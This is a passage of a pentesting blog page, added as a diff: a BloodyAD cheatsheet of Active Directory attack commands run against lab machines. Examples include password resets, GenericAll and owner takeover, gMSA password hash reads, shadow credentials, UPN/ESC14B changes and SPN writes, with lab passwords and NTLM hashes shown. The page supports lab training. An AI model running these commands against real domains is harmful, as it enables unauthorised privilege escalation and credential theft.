@@ -1,0 +1,317 @@
+<!doctype html>
+<html lang="en">
+<head>
+
+
+<meta charset="utf-8"><script>(function(){try{var T={"butterfly":"/","claude":"/claude/","loaf":"/loaf/"},here="loaf",root=T[here],L=location,p=L.pathname;var q=new URLSearchParams(L.search),want=q.get("theme"),picked=want&&T[want]!==undefined;if(picked){localStorage.setItem("blog-theme",want);q.delete("theme")}else{want=localStorage.getItem("blog-theme")}var s=q.toString();s=s?"?"+s:"";var lost=p.indexOf(root)!==0;for(var k in T){if(k!==here&&T[k].length>root.length&&p.indexOf(T[k])===0)lost=true}if(want&&want!==here&&T[want]!==undefined&&!lost){L.replace(T[want]+p.slice(root.length)+s+L.hash);return}if(picked){history.replaceState(null,"",p+s+L.hash);var st=document.createElement("style");st.textContent="@view-transition{navigation:auto}";document.head.appendChild(st)}}catch(e){}})()</script><style>.tsw{position:relative}.tsw summary{list-style:none;cursor:pointer;user-select:none}.tsw summary::-webkit-details-marker{display:none}.tsw-menu{position:absolute;right:0;top:calc(100% + .4rem);z-index:50;display:grid;min-width:9.5rem;padding:.3rem;border:1px solid var(--line);border-radius:8px;background:var(--bg);box-shadow:0 6px 24px rgba(0,0,0,.18)}.tsw-menu a{display:block;padding:.35rem .6rem;border-radius:5px;color:var(--fg);text-decoration:none;white-space:nowrap;box-shadow:none}.tsw-menu a:hover{background:var(--surface)}.tsw-menu a[aria-current]{color:var(--accent)}.tsw-menu a[aria-current]::after{content:" ✓"}@media print{.tsw{display:none}}</style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>BloodyAD Cheatsheet · serioton</title>
+
+<meta name="description" content="BloodyAD commands with examples">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BloodyAD Cheatsheet">
+<meta property="og:url" content="https://seriotonctf.github.io/loaf/BloodyAD-Cheatsheet/index.html">
+<meta property="og:site_name" content="serioton">
+<meta property="og:description" content="BloodyAD commands with examples">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://seriotonctf.github.io/img/thumbnails/bloodyad-cheatsheet.png">
+<meta property="article:published_time" content="2024-12-01T20:16:14.000Z">
+<meta property="article:modified_time" content="2026-08-03T14:50:13.000Z">
+<meta property="article:author" content="serioton">
+<meta property="article:tag" content="active directory">
+<meta property="article:tag" content="acl abuse">
+<meta property="article:tag" content="shadow credentials">
+<meta property="article:tag" content="rbcd">
+<meta property="article:tag" content="bloodyad">
+<meta property="article:tag" content="gmsa">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://seriotonctf.github.io/img/thumbnails/bloodyad-cheatsheet.png">
+<link rel="canonical" href="https://seriotonctf.github.io/BloodyAD-Cheatsheet/">
+<meta name="theme-color" content="#fbfaf7" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#131214" media="(prefers-color-scheme: dark)">
+
+<link rel="icon" href="/loaf/img/iconcat.png">
+
+
+<link rel="alternate" type="application/atom+xml" title="serioton" href="/loaf/atom.xml">
+
+<link rel="preload" as="font" type="font/woff2" href="/loaf/fonts/iosevka-latin-400-normal.woff2" crossorigin>
+<link rel="stylesheet" href="/loaf/css/loaf.css">
+<script>try{var t=localStorage.getItem('theme');if(t==='dark'||t==='light')document.documentElement.dataset.theme=t}catch(e){}</script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<header class="site-header wrap">
+  <a class="brand" href="/loaf/">
+    <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M3.5 3.5 9 7.6c2-.5 4-.5 6 0l5.5-4.1V14c0 4-3.8 7-8.5 7s-8.5-3-8.5-7Z"/><g fill="var(--bg)"><ellipse cx="8.9" cy="13.6" rx="1.15" ry="1.5"/><ellipse cx="15.1" cy="13.6" rx="1.15" ry="1.5"/></g></svg>
+    <span>serioton</span>
+  </a>
+  <nav class="nav" aria-label="main">
+    
+    <a href="/loaf/archives/">archives</a>
+    
+    <a href="/loaf/categories/">categories</a>
+    
+    <a href="/loaf/tags/">tags</a>
+    
+    <a href="/loaf/about/">about</a>
+    
+  </nav>
+  <div class="tools">
+    <details class="tsw"><summary class="icon-btn" aria-label="switch the blog theme" title="theme"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3.5" y="3.5" width="7" height="7" rx="1.5"/><rect x="13.5" y="3.5" width="7" height="7" rx="1.5"/><rect x="3.5" y="13.5" width="7" height="7" rx="1.5"/><rect x="13.5" y="13.5" width="7" height="7" rx="1.5" fill="currentColor"/></svg></summary><div class="tsw-menu"><a data-switch="butterfly" href="/?theme=butterfly">Butterfly</a><a data-switch="claude" href="/claude/?theme=claude">Claude Code</a><a data-switch="loaf" href="/loaf/?theme=loaf" aria-current="true">Loaf</a></div></details>
+    
+    <button class="icon-btn" type="button" data-search aria-label="search" title="search ( / )">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" aria-hidden="true"><circle cx="10.5" cy="10.5" r="6"/><path d="m15 15 5.5 5.5"/></svg>
+    </button>
+    
+    <button class="icon-btn" type="button" data-theme-toggle aria-label="switch between light and dark" title="lights">
+      <svg class="eye" viewBox="0 0 24 24" aria-hidden="true"><path d="M1.5 12Q12-.5 22.5 12 12 24.5 1.5 12Z" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/><ellipse class="pupil" cx="12" cy="12" rx="4.2" ry="4.6" fill="currentColor"/></svg>
+    </button>
+  </div>
+</header>
+
+<main id="main" class="wrap">
+
+
+
+<article class="post">
+  <header class="post-head">
+    <div class="meta">
+      <time datetime="2024-12-01T20:16:14.000Z">2024-12-01</time>
+      <a href="/loaf/categories/cheatsheet/">cheatsheet</a>
+    </div>
+    <h1>BloodyAD Cheatsheet</h1>
+    <p class="lede">BloodyAD commands with examples</p>
+    
+    <div class="meta facts">
+      
+      <a href="/loaf/tags/active-directory/" rel="tag">#active directory</a><a href="/loaf/tags/acl-abuse/" rel="tag">#acl abuse</a><a href="/loaf/tags/shadow-credentials/" rel="tag">#shadow credentials</a><a href="/loaf/tags/rbcd/" rel="tag">#rbcd</a><a href="/loaf/tags/bloodyad/" rel="tag">#bloodyad</a><a href="/loaf/tags/gmsa/" rel="tag">#gmsa</a>
+    </div>
+    
+  </header>
+
+  
+
+  <div class="post-body">
+    
+    <nav class="contents" aria-label="table of contents">
+      <details>
+        <summary>contents</summary>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Installation"><span class="toc-text">Installation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Retrieve-User-Information"><span class="toc-text">Retrieve User Information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Add-User-To-Group"><span class="toc-text">Add User To Group</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Change-Password"><span class="toc-text">Change Password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Give-User-GenericAll-Rights"><span class="toc-text">Give User GenericAll Rights</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WriteOwner"><span class="toc-text">WriteOwner</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ReadGMSAPassword"><span class="toc-text">ReadGMSAPassword</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enable-a-Disabled-Account"><span class="toc-text">Enable a Disabled Account</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Add-The-TRUSTED-TO-AUTH-FOR-DELEGATION-Flag"><span class="toc-text">Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Modify-UPN"><span class="toc-text">Modify UPN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MachineAccountQuota"><span class="toc-text">MachineAccountQuota</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Modify-the-email"><span class="toc-text">Modify the email</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Modify-the-altSecurityIdentities-attribute-ESC14B"><span class="toc-text">Modify the altSecurityIdentities attribute (ESC14B)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Find-Writable-Attributes"><span class="toc-text">Find Writable Attributes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shadow-Credentials"><span class="toc-text">Shadow Credentials</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WriteSPN"><span class="toc-text">WriteSPN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Find-Deleted-Objects"><span class="toc-text">Find Deleted Objects</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extended-Search-Operations"><span class="toc-text">Extended Search Operations</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Restore-a-deleted-object"><span class="toc-text">Restore a deleted object</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-computer-account"><span class="toc-text">Create a new computer account</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Add-Resource-Based-Constrained-Delegation"><span class="toc-text">Add Resource Based Constrained Delegation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Register-a-DNS-Record"><span class="toc-text">Register a DNS Record</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overwrite-the-logon-script-path"><span class="toc-text">Overwrite the logon script path</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Collect-Bloodhound-data"><span class="toc-text">Collect Bloodhound data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Change-Group-Type-to-Domain-Local"><span class="toc-text">Change Group Type to Domain Local</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-the-msDS-ManagedPassword-blob"><span class="toc-text">Get the msDS-ManagedPassword blob</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#add-badSuccessor"><span class="toc-text">add badSuccessor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Notes"><span class="toc-text">Notes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Machines-To-Practice-HackTheBox"><span class="toc-text">Machines To Practice (HackTheBox)</span></a></li></ol>
+      </details>
+    </nav>
+    
+    
+    <div class="section-filter" hidden>
+      <input type="search" placeholder="filter sections…" autocomplete="off" spellcheck="false" aria-label="filter sections">
+      <span aria-live="polite"></span>
+    </div>
+    
+    <div class="prose">
+      <h3 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h3><p>Using uv</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uv tool install bloodyAD</span><br></pre></td></tr></table></figure>
+<p>Using pipx</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pipx install bloodyAD</span><br></pre></td></tr></table></figure>
+
+<h3 id="Retrieve-User-Information"><a href="#Retrieve-User-Information" class="headerlink" title="Retrieve User Information"></a>Retrieve User Information</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> get object <span class="var">$target_username</span></span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc.redelegate.vl -d redelegate.vl -u helen.frost -p P@ssword1 get object administrator</span><br><span class="line out"></span><br><span class="line out">distinguishedName: CN=Administrator,CN=Users,DC=redelegate,DC=vl</span><br><span class="line out">accountExpires: 1601-01-01 00:00:00+00:00</span><br><span class="line out">adminCount: 1</span><br><span class="line out">cn: Administrator</span><br><span class="line out">description: Built-in account for administering the computer/domain</span><br><span class="line out">userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; NOT_DELEGATED</span><br></pre></td></tr></table></figure>
+
+<h3 id="Add-User-To-Group"><a href="#Add-User-To-Group" class="headerlink" title="Add User To Group"></a>Add User To Group</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> add groupMember <span class="var">$group_name</span> <span class="var">$member_to_add</span></span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc.rustykey.htb -d rustykey.htb -u &#x27;it-computer3$&#x27; -k add groupMember helpdesk &#x27;it-computer3$&#x27;</span><br><span class="line out">[+] it-computer3$ added to helpdesk</span><br></pre></td></tr></table></figure>
+
+<h3 id="Change-Password"><a href="#Change-Password" class="headerlink" title="Change Password"></a>Change Password</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> set password <span class="var">$target_username</span> <span class="var">$new_password</span></span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host DC1.KLENDATHU.VL -d KLENDATHU.VL -u rasczak -p starship99 set password RICO NewP@ssw0rd</span><br><span class="line out">[+] Password changed successfully!</span><br></pre></td></tr></table></figure>
+
+<h3 id="Give-User-GenericAll-Rights"><a href="#Give-User-GenericAll-Rights" class="headerlink" title="Give User GenericAll Rights"></a>Give User GenericAll Rights</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> add genericAll <span class="var">$DN</span> <span class="var">$target_username</span></span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc01.rebound.htb -d rebound.htb -u oorend -p &#x27;1GR8t@$$4u&#x27; add genericAll &#x27;OU=SERVICE USERS,DC=REBOUND,DC=HTB&#x27; oorend</span><br><span class="line out">[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB</span><br></pre></td></tr></table></figure>
+<p>Using the SID:</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc01.rebound.htb -d rebound.htb -u oorend -p &#x27;1GR8t@$$4u&#x27; add genericAll &#x27;S-1-5-21-2410575906-3092493790-2123333151-1104&#x27; &#x27;S-1-5-21-750635624-2058721901-1932338391-2617&#x27;</span><br><span class="line out">[+] S-1-5-21-750635624-2058721901-1932338391-2617 has now GenericAll on S-1-5-21-2410575906-3092493790-2123333151-1104</span><br></pre></td></tr></table></figure>
+
+<h3 id="WriteOwner"><a href="#WriteOwner" class="headerlink" title="WriteOwner"></a>WriteOwner</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> set owner <span class="var">$target_group</span> <span class="var">$target_username</span></span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc01.haze.htb -d dc01.haze.htb -u &#x27;Haze-IT-Backup$&#x27; -p &#x27;:735c02c6b2dc54c3c8c6891f55279ebc&#x27; set owner SUPPORT_SERVICES &#x27;Haze-IT-Backup$&#x27;</span><br><span class="line out">[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on SUPPORT_SERVICES</span><br></pre></td></tr></table></figure>
+
+<h3 id="ReadGMSAPassword"><a href="#ReadGMSAPassword" class="headerlink" title="ReadGMSAPassword"></a>ReadGMSAPassword</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> get object <span class="var">$target_username</span> --attr msDS-ManagedPassword</span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc01.vintage.htb -d vintage.htb -u &#x27;fs01$&#x27; -p &#x27;P@ssw0rd&#x27; -k get object &#x27;gMSA01$&#x27; --attr msDS-ManagedPassword</span><br><span class="line out"></span><br><span class="line out">distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb</span><br><span class="line out">msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:54311f0ed05b807a7aaf5943b595f224</span><br><span class="line out">msDS-ManagedPassword.B64ENCODED: c6qwf6x+EXiEYKGhCu/wTBcnp6hz3ppQG2uReaV8QV+JCaIhn2MobwBxF4Q6fd3W5P13wvh2Jf/Wp2WHsjIEjkbF0duDHoCBAK31Q+BoQg0eUHbsRcksNrkLcPtkZ5eUhK+TzgpXeFKt0VCOWFkAOStKE1H5PDfUGoC2xuP+Tceg7iV0IcMBaR8Db3UgqaqP2LLRiimuL6ZO4xl6sSRKrdRQEQOR7L9fFw9JW7myCsbj2TPxFc5WaMQtWi456OvwBQn4jhdty5tSjv2uMlcq+sQMz60voxH6sClACPGKJMCr2FNVJP6dd1GTdvh6n5Dbh/yhHCAF8UzYeGXv2Nx3Dw==</span><br></pre></td></tr></table></figure>
+
+<h3 id="Enable-a-Disabled-Account"><a href="#Enable-a-Disabled-Account" class="headerlink" title="Enable a Disabled Account"></a>Enable a Disabled Account</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> remove uac <span class="var">$target_username</span> -f ACCOUNTDISABLE</span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc01.mirage.htb -d mirage.htb -u mark.bbond -p &#x27;1day@atime&#x27; -k remove uac javier.mmarshall -f ACCOUNTDISABLE</span><br><span class="line out">[-] [&#x27;ACCOUNTDISABLE&#x27;] property flags removed from javier.mmarshall&#x27;s userAccountControl</span><br></pre></td></tr></table></figure>
+
+<h3 id="Add-The-TRUSTED-TO-AUTH-FOR-DELEGATION-Flag"><a href="#Add-The-TRUSTED-TO-AUTH-FOR-DELEGATION-Flag" class="headerlink" title="Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag"></a>Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> add uac <span class="var">$target_username</span> -f TRUSTED_TO_AUTH_FOR_DELEGATION</span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc.redelegate.vl -d redelegate.vl -u helen.frost -p &#x27;P@ssword1&#x27; -k add uac &#x27;FS01$&#x27; -f TRUSTED_TO_AUTH_FOR_DELEGATION</span><br><span class="line out">[-] [&#x27;TRUSTED_TO_AUTH_FOR_DELEGATION&#x27;] property flags added to FS01$&#x27;s userAccountControl</span><br></pre></td></tr></table></figure>
+
+<h3 id="Modify-UPN"><a href="#Modify-UPN" class="headerlink" title="Modify UPN"></a>Modify UPN</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> set object <span class="var">$old_upn</span> userPrincipalName -v <span class="var">$new_upn</span></span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc-01.darkcorp.htb -d darkcorp.htb -u john.w -p &#x27;Pack_Beneath_Solid9!&#x27; set object angela.w userPrincipalName -v angela.w.adm</span><br><span class="line out">[+] angela.w&#x27;s userPrincipalName has been updated</span><br></pre></td></tr></table></figure>
+<p>Check if it has been modified</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> get object <span class="var">$target_user</span> --attr userPrincipalName</span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc-01.darkcorp.htb -d darkcorp.htb -u john.w -p &#x27;Pack_Beneath_Solid9!&#x27; get object angela.w --attr userPrincipalName</span><br><span class="line out"></span><br><span class="line out">distinguishedName: CN=Angela Williams,CN=Users,DC=darkcorp,DC=htb</span><br><span class="line out">userPrincipalName: angela.w.adm</span><br></pre></td></tr></table></figure>
+
+<h3 id="MachineAccountQuota"><a href="#MachineAccountQuota" class="headerlink" title="MachineAccountQuota"></a>MachineAccountQuota</h3><p>Enumerate MachineAccountQuota</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> get object &#x27;DC=dc,DC=dc&#x27; --attr ms-DS-MachineAccountQuota</span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc-01.darkcorp.htb -d darkcorp.htb -u administrator -p &#x27;:fcb3ca5a19a1ccf2d14c13e8b64cde0f&#x27; get object &#x27;DC=darkcorp,DC=htb&#x27; --attr ms-DS-MachineAccountQuota</span><br><span class="line out"></span><br><span class="line out">distinguishedName: DC=darkcorp,DC=htb</span><br><span class="line out">ms-DS-MachineAccountQuota: 0</span><br></pre></td></tr></table></figure>
+<p>Set MachineAccountQuota value to 10</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> set object &#x27;DC=dc,DC=dc&#x27; ms-DS-MachineAccountQuota -v 10</span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc-01.darkcorp.htb -d darkcorp.htb -u administrator -p &#x27;:fcb3ca5a19a1ccf2d14c13e8b64cde0f&#x27; set object &#x27;DC=darkcorp,DC=htb&#x27; ms-DS-MachineAccountQuota -v 10</span><br><span class="line out">[+] DC=darkcorp,DC=htb&#x27;s ms-DS-MachineAccountQuota has been updated</span><br></pre></td></tr></table></figure>
+
+<h3 id="Modify-the-email"><a href="#Modify-the-email" class="headerlink" title="Modify the email"></a>Modify the email</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> set object <span class="var">$target_user</span> mail -v newmail@test.local</span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p P@ssw0rd set object d.baker mail -v h.brown@scepter.htb</span><br><span class="line out">[+] d.baker&#x27;s mail has been updated</span><br></pre></td></tr></table></figure>
+
+<h3 id="Modify-the-altSecurityIdentities-attribute-ESC14B"><a href="#Modify-the-altSecurityIdentities-attribute-ESC14B" class="headerlink" title="Modify the altSecurityIdentities attribute (ESC14B)"></a>Modify the altSecurityIdentities attribute (ESC14B)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> set object <span class="var">$target_user</span> altSecurityIdentities -v &#x27;X509:&lt;RFC822&gt;user@test.local&#x27;</span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc01.scepter.htb -d scepter.htb -u h.brown -k set object p.adams altSecurityIdentities -v &#x27;X509:&lt;RFC822&gt;p.adams@scepter.htb&#x27;</span><br><span class="line out">[+] p.adams&#x27;s altSecurityIdentities has been updated</span><br></pre></td></tr></table></figure>
+
+<h3 id="Find-Writable-Attributes"><a href="#Find-Writable-Attributes" class="headerlink" title="Find Writable Attributes"></a>Find Writable Attributes</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> get writable --detail</span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc01.scepter.htb -d scepter.htb -u &#x27;h.brown&#x27; -k get writable --detail</span><br><span class="line out"></span><br><span class="line out">distinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb</span><br><span class="line out">altSecurityIdentities: WRITE</span><br></pre></td></tr></table></figure>
+
+<h3 id="Shadow-Credentials"><a href="#Shadow-Credentials" class="headerlink" title="Shadow Credentials"></a>Shadow Credentials</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> add shadowCredentials <span class="var">$target</span></span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host haze.htb -d haze.htb -u &#x27;haze-it-backup$&#x27; -p &#x27;:735c02c6b2dc54c3c8c6891f55279ebc&#x27; -s add shadowCredentials &#x27;edward.martin&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="WriteSPN"><a href="#WriteSPN" class="headerlink" title="WriteSPN"></a>WriteSPN</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> set object <span class="var">$target</span> servicePrincipalName -v &#x27;domain/meow&#x27;</span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u henry -p &#x27;H3nry_987TGV!&#x27; set object alfred servicePrincipalName -v &#x27;tombwatcher/meow&#x27;</span><br><span class="line out">[+] alfred&#x27;s servicePrincipalName has been updated</span><br></pre></td></tr></table></figure>
+
+<h3 id="Find-Deleted-Objects"><a href="#Find-Deleted-Objects" class="headerlink" title="Find Deleted Objects"></a>Find Deleted Objects</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> get writable</span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc.voleur.htb -d voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k get writable</span><br><span class="line out"></span><br><span class="line out">distinguishedName: CN=Todd Wolfe\\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb</span><br><span class="line out">permission: CREATE_CHILD; WRITE</span><br></pre></td></tr></table></figure>
+
+<h3 id="Extended-Search-Operations"><a href="#Extended-Search-Operations" class="headerlink" title="Extended Search Operations"></a>Extended Search Operations</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> get search -h</span><br></pre></td></tr></table></figure>
+<p>e.g.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 to display tombstoned</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> -k get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065</span><br></pre></td></tr></table></figure>
+
+<h3 id="Restore-a-deleted-object"><a href="#Restore-a-deleted-object" class="headerlink" title="Restore a deleted object"></a>Restore a deleted object</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> -k set restore <span class="var">$user_to_restore</span></span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
